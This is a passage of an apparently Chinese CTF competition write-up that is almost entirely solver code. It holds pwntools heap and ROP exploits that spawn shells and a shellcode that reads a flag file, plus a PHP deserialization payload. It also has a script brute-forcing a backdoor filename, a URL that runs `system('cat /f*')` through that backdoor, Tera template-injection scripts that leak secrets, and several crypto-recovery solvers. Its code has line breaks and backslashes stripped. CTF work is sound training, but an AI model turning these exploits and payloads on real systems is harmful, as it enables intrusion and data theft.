    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')sh.send((cyclic(64) + flat([    0x603000-0x100,    libc_addr + 0x000000000002164f, 0x601000,    libc_addr + 0x0000000000023a6a, 0x2000,    libc_addr + 0x0000000000001b96, 7,    libc_addr + 0x11b7e0,    libc_addr + 0x0000000000002b25]) + shellcode).ljust(0x100, b'0'))
sh.interactive()
```



```
__int64 edit(){  unsigned int v1; // [rsp+0h] [rbp-10h]  int v2; // [rsp+4h] [rbp-Ch]
  puts("input index");  v1 = get_int();  if ( v1 < 0x11 )  {    puts("input your name size");    v2 = get_int();    if ( qword_4060[v1] && v2 <= ptr_size[v1] && v2 >= 0 )    {      puts("input your name");      readn(qword_4060[v1], v2);                // off-by-one    }    return 0LL;  }  else  {    puts("invalid index");    return 0LL;  }}
```



```
unsigned __int64 menu(){  void *ptr; // [rsp+0h] [rbp-10h]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  v2 = __readfsqword(0x28u);  puts("Welcome to the 4everdestiny@Lancet lab");  puts("This is the babyheap for glibc 2.38");  puts("i don't want to make a seccomp function");  puts("and this line will make the game easier");  ptr = malloc(0x10uLL);  printf("%pn", ptr);  free(ptr);  return v2 - __readfsqword(0x28u);}
__int64 add(){  int i; // [rsp+0h] [rbp-10h]  int v2; // [rsp+4h] [rbp-Ch]
  for ( i = 0; i <= 15 && qword_4060[i]; ++i )    ;  if ( i == 16 )  {    puts("list fulln");    return 0LL;  }  else  {    puts("input your name size");    v2 = get_int();    if ( v2 > 0x3FF && v2 <= 0x500 )    {      qword_4060[i] = malloc(v2);      ptr_size[i] = v2;      puts("input your name");      readn(qword_4060[i], (unsigned int)v2);      return 0LL;    }    else    {      puts("invalid size");      return 0LL;    }  }}
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.7', 10001)
def add(size, name):    sh.sendlineafter(b'>> n', b'1')    sh.sendlineafter(b'sizen', str(size).encode())    sh.sendafter(b'namen', name)
def edit(index, size, name):    sh.sendlineafter(b'>> n', b'2')    sh.sendlineafter(b'indexn', str(index).encode())    sh.sendlineafter(b'sizen', str(size).encode())    sh.sendafter(b'namen', name)
def show(index):    sh.sendlineafter(b'>> n', b'3')    sh.sendlineafter(b'indexn', str(index).encode())
def delete(index):    sh.sendlineafter(b'>> n', b'4')    sh.sendlineafter(b'indexn', str(index).encode())
sh.recvuntil(b'easiern')heap_addr = int(sh.recvline(), 16) - 0x2a0success('heap_addr: ' + hex(heap_addr))
add(0x408, b'n')add(0x4f8, b'n')edit(0, 0x408, flat({0:heap_addr + 0x2b0, 8:heap_addr + 0x2b0, 0x400:0x410}, filler=b'0'))add(0x4f8, b'n')delete(1)add(0x418, b'n')add(0x4e8, b'n')delete(1)add(0x500, b'n')show(0)libc_addr = u64(sh.recvn(6) + b'00') - 0x1ff0f0success('libc_addr: ' + hex(libc_addr))delete(3)add(0x408, b'n')add(0x408, b'n')delete(4)delete(3)edit(0, 0x10, p64(((heap_addr + 0x2c0)>>0xc) ^ (libc_addr + 0x1ff7a0)) + b'n')add(0x408, b'n')add(0x408, flat([0x00000000fbad3887, 0, 0, 0, libc_addr + 0x206258, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8]) + b'n')stack_addr = u64(sh.recvn(8))success('stack_addr: ' + hex(stack_addr))add(0x408, b'n')delete(5)delete(3)edit(0, 0x10, p64(((heap_addr + 0x2c0)>>0xc) ^ (stack_addr - 0x128)) + b'n')add(0x408, b'n')add(0x408, flat([0, libc_addr + 0x0000000000026a3e, libc_addr + 0x0000000000028715, libc_addr + 0x1c041b, libc_addr + 0x55230]) + b'n')sh.sendlineafter(b'>> n', b'5')
sh.interactive()
```



```
unsigned __int64 change_default(){  int v1; // [rsp+Ch] [rbp-14h]  int v2; // [rsp+10h] [rbp-10h]  char buf[4]; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
  v4 = __readfsqword(0x28u);  show_list();  puts("input the id you want to change");  printf(">>>");  read(0, buf, 4uLL);  v1 = atol(buf) - 1;  if ( v1 >= 0 && v1 <= 2 )  {    puts("input which coffee you want to change");    printf(">>>");    read(0, buf, 4uLL);    v2 = atol(buf) - 1;    if ( v2 >= 0 && v2 <= 4 || *((_QWORD *)&copy_left_coffee + 7 * v1 + v2) )    {      puts("input your content");      read(0, *((void **)&copy_left_coffee + 7 * v1 + v2), 0x80uLL);      puts("done");      update(2LL);    }    else    {      puts("invalid coffee");    }  }  else  {    puts("invalid id");  }  return __readfsqword(0x28u) ^ v4;}
```



```
from pwn import *from struct import packfrom ctypes import *import base64from subprocess import run#from LibcSearcher import *from struct import packimport tty
def debug(c = 0):    if(c):        gdb.attach(p, c)    else:        gdb.attach(p)        pause()def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))#-----------------------------------------------------------------------------------------s = lambda data : p.send(data)sa  = lambda text,data  :p.sendafter(text, data)sl  = lambda data   :p.sendline(data)sla = lambda text,data  :p.sendlineafter(text, data)r   = lambda num=4096   :p.recv(num)rl  = lambda text   :p.recvuntil(text)pr = lambda num=4096 :print(p.recv(num))inter   = lambda        :p.interactive()l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))int16   = lambda data   :int(data,16)lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))#-----------------------------------------------------------------------------------------
context(os='linux', arch='amd64', log_level='debug')#p = remote('120.46.65.156', 32104)p = process('./pwn')elf = ELF('./pwn')libc = ELF('./libc-2.31.so')
def buy(idx, data = b'a'*8):  sla(b'>>>', b'1')  sla(b'buy', str(idx))  sla(b'N', b'y')  sa(b'coffee', data)def show():  sla(b'>>>', b'2')  def re(idx):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'1')  sla(b'sh', str(idx))  sla(b'>>>', b'3')def ed(idx, of, data):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'2')  sa(b'>>>', str(idx + 1))  sa(b'>>>', str(of + 1))  sa(b'content', data)  sla(b'>>>', b'3')  def ed_(idx, of, data):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'2')  sla(b'>>>', str(idx + 1))  sla(b'>>>', str(of + 1))  sa(b'content', data)

buy(1)buy(1)pl = p64(0x00000000fbad1800) + p64(0)*3 + p8(0x0)ed_(0, -0x20, pl)libc_base = l64() - 0x1ec980sla(b'>>>', b'3')
free_hook = libc_base + libc.sym['__free_hook']system, binsh = get_sb()
#debug('b *0x401905')#debug('b *0x401ce9nb *0x401905')
#buy(2)pl = p64(0x00000000405e20) + p64(libc_base + 0x223190) + p64(libc_base + 0x20cbc0)pl += p64(system)ed(1, -0xa0, pl)
buy(3, b'/bin/shx00')
inter()lg('libc_base', libc_base)
#debug()pause()
```



```
<?phpclass Hacker{    public $exp;    public $cmd;}
class A{    public $hacker;}class C{    public $finish;    public function __get($value)    {        $this->finish->hacker();        echo 'nonono';    }}class E{    public $hacker;}
class H{    public $username;}
class K{    public $func;}
class R{    public $method;    public $args;}$a=new H();$a ->username=new Hacker();echo serialize($a);
```



```
import requests
list = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o',        'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']url = "http://172.10.0.5/"
filename = ""tmp = ""
for j in range(32):    for i in list:        tmp = filename        tmp += i        print(filename)        payload = "glob://backdoor_" + tmp + "*.php"        data = {            "filename": payload        }        resp = requests.post(url, data=data)        if "yesyesyes" in resp.text:            filename = tmp            break        else:            tmp = ""
```



```
http://172.10.0.5/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=11&title[]=.php&data[]=<?php system("cat /f*");
```



```
import requests
url = "http://172.10.0.3:8081/"

for i in range(32, 127):    code = chr(i)    data = "data={% set a = [__tera_context] %}{% for char in __tera_context %}{% if char == " + f"'{code}'" + " %}" + f" {code} " + "{%- else -%}0{%- endif -%}{% endfor %}"    headers = {        "Content-Type": "application/x-www-form-urlencoded"    }    print(data)    r = requests.post(url, data=data, headers=headers)
    print(r.text)
```



```
import stringimport requests
url = "http://172.10.0.3:8081"
def getflag(re):    payload = """data={% set q="galf"|reverse %}{% set u=get_env(name=q) %}    {% if u is matching('z.*') %}    ok    {% endif %}""".replace("z", re)    headers = {        "Content-Type": "application/x-www-form-urlencoded"    }    result = requests.post(url, data=payload, headers=headers).text    if "ok" in result:        return True    return False
str = string.hexdigits + "-+"flag = "fla[g]."while True:    for i in str:        if getflag(flag + i):            flag += i            print(flag)            break
```



```
# https://github.com/NonupleBroken/ExtendMT19937Predictor"""randomuniform"""import randomfrom extend_mt19937_predictor import ExtendMT19937Predictor
with open('./output.txt', 'r') as f:    data = f.readlines()X = []R = []leak = 158171468736013100218170873274656605219228738469715092751861925345310881653082508445746109167302799236685145510095499361526242392251594397820661050281094210672424887670015189702781308615421102937559185479455827148241690888934661637911906309379701856488858180027365752169466863585611322838180758159364570481257p = 667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891
for i in range(len(data)):    tmp = data[i].split(' ')    X.append(int(tmp[0]))    R.append(int(tmp[1]))R.append(leak)
# 恢复X[-1]predictor = ExtendMT19937Predictor()for i in X:    predictor.setrandbits(i, 1024)X.append(predictor.predict_getrandbits(1024))
# 恢复A[1:]A = []predictor = ExtendMT19937Predictor()for i in X:    predictor.setrandbits(i, 1024)_ = [predictor.backtrack_getrandbits(1024) for _ in range(len(X))]  # 回溯到起始状态for i in range(20):    A.append(predictor.backtrack_getrandbits(1024))A = A[::-1]print(f"{A=}")print(f"{X=}")print(f"{R=}")
```



```
A=X=R=leak = 158171468736013100218170873274656605219228738469715092751861925345310881653082508445746109167302799236685145510095499361526242392251594397820661050281094210672424887670015189702781308615421102937559185479455827148241690888934661637911906309379701856488858180027365752169466863585611322838180758159364570481257p = 667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029   c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891PR.<x> = PolynomialRing(Zmod(p))A = [x] +A
def F(x):    res = 0    tmp = 1    for i in range(21):        res = (res + tmp * A[i])        tmp = tmp * x    return res
f = F(X[0])-R[0]f.roots()
```



```
from Crypto.Util.number import *P = 92422003757477651157474383100036998824887848419954840007147868223910074931859933956269885856128093345487882260496791272977844862352094356168399257688148495739541010758727078419554501190171624312463235528402998918943680454965800744650511720557056811235552334860437375771202122918781073950952368367594976459763c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891e = 65537print(long_to_bytes(int(pow(c, inverse(e, P-1), P))))  # flag{2f43430b-3c31-03ee-0a92-5b24826c015c}
```



```
from Crypto.Util.strxor import strxor
enc_gift1 = 'bad7dbcff968d7cdbf51da011fe94e176fc8e7528e4dd85d2d5fc20ba69cefb7bfd03152a2874705bd2d857ea75b3216a830215db74772d9b9e9c218271d562694d3642d2917972fdb8c7363d8125730a50824cd8dc7e34cd4fa54be427cca'enc_flag = 'c1c78891e30cd4c0aa5ed65c17e8550429c4e640881f9f1d6a56df'

enc_gift1 = bytes.fromhex(enc_gift1)enc_flag = bytes.fromhex(enc_flag)
LEN = 1enc_gift1 = [enc_gift1[LEN * i:LEN * (i + 1)] for i in range(len(enc_gift1) // LEN)]enc_flag = [enc_flag[LEN * i:LEN * (i + 1)] for i in range(len(enc_flag) // LEN)]
tmp = [strxor(enc_gift1[i], enc_flag[i]) for i in range(len(enc_flag))]tmp = b''.join(tmp)
gift1 = b'I am Deathwing, the Destroyer, the end of all things!'  # Googleprint(gift1[:len(tmp)])print(gift1[:len(tmp)])flag1 = strxor(tmp, gift1[:len(tmp)])print(flag1) # b'2023: flag{4ff732dd2B7445fd'# b'2023: flag{4ff732dd2b7445fd'
```



```
import hashlib, binasciifrom Crypto.Cipher import AESimport itertoolsfrom tqdm import tqdmfrom Crypto.Util.strxor import strxorkey2 = list(b'tn*-ix6L*tCa*}i*')# print(key2)import stringTTMP = ''for i in itertools.product(string.printable[:-6], repeat=4):    i = [ord(_) for _ in list(i)]    tmp_key2 = key2    tmp_key2[2] = i[0]    tmp_key2[8] = i[1]    tmp_key2[12] = i[2]    tmp_key2[15] = i[3]    tmp_key2 = bytes(tmp_key2)    if TTMP != i[0]:        TTMP = i[0]        print(TTMP)

    h = binascii.unhexlify(hashlib.sha256(tmp_key2).hexdigest())[:11]    gift2 = b'I tell you this, for when my days have come to an end , you, shall be King.' + h    LEN = len(tmp_key2)    padding = bytes((LEN - len(gift2) % LEN) * '&', encoding='utf-8')    gift2 += padding    gift2 = [gift2[LEN * i:LEN * (i + 1)] for i in range(len(gift2) // LEN)]    # print(gift2)
    enc_gift2 = 'fee046b4d2918096cfa3b76d6622914395c7e28eef'
    enc_gift2 = bytes.fromhex(enc_gift2)[-16:]    cipher = AES.new(tmp_key2, AES.MODE_ECB)    C = enc_gift2    for i in range(6):        tmp = cipher.decrypt(C)        C = strxor(tmp, gift2[5 - i])    flag2 = C    try:        flag2 = flag2.decode()        if all([__ in string.hexdigits for __ in flag2[3:5]]):            print(flag2)    except:        continue
```



```
from scapy.all import *
def extract_udp_data(pcap_file, output_file):    udp_data = []    packets = rdpcap(pcap_file)
    for packet in packets:        if UDP in packet:            udp_payload = packet[UDP].payload            timestamp = packet.time            udp_data.append((timestamp, bytes(udp_payload), packet[UDP].dport))
    # Sort the data by timestamp    udp_data.sort(key=lambda x: x[0])
    with open(output_file, 'wb') as file:        for timestamp, data, port in udp_data:            if port == 12345:                # Reverse the data for port 12345                data = data[::-1]            file.write(data)
if __name__ == "__main__":    pcap_file = "secret.pcapng"    output_file = "aaa_combined_data"
    extract_udp_data(pcap_file, output_file)    print(f"UDP data extracted from {pcap_file} and saved to {output_file}")
```



```
from PIL import Image, ImageDrawimport re
# 数据字符串data = """txt直接粘贴过来就行，太大了，腾讯文档粘贴不过来"""
# 使用正则表达式解析数据点pattern = r"Mouse : (d+) : (d+) : Move : 0 : 0 : 0"matches = re.findall(pattern, data)
# 提取坐标数据points = [(int(match[0]), int(match[1])) for match in matches]
# 计算图像尺寸max_x = max(points, key=lambda p: p[0])[0]max_y = max(points, key=lambda p: p[1])[1]
# 增大图像尺寸image_width = max_x + 50  # 增加 50 像素的宽度image_height = max_y + 50  # 增加 50 像素的高度
# 创建图像image = Image.new("RGB", (image_width, image_height), "white")draw = ImageDraw.Draw(image)
# 缩放因子，可以根据需要调整scaling_factor = 0.5  # 缩放因子
# 缩放坐标数据scaled_points = [(int(p[0] * scaling_factor), int(p[1] * scaling_factor)) for p in points]
# 绘制路径draw.line(scaled_points, fill="blue", width=1)
# 保存图像image.show()image.save("path.png")
# 显示
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/10-1699199397.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/10-1699199397.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1699199398.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1699199399.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/7-1699199400.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1699199401.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/9-1699199401.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1699199402.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/8-1699199402.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/5-1699199403.png)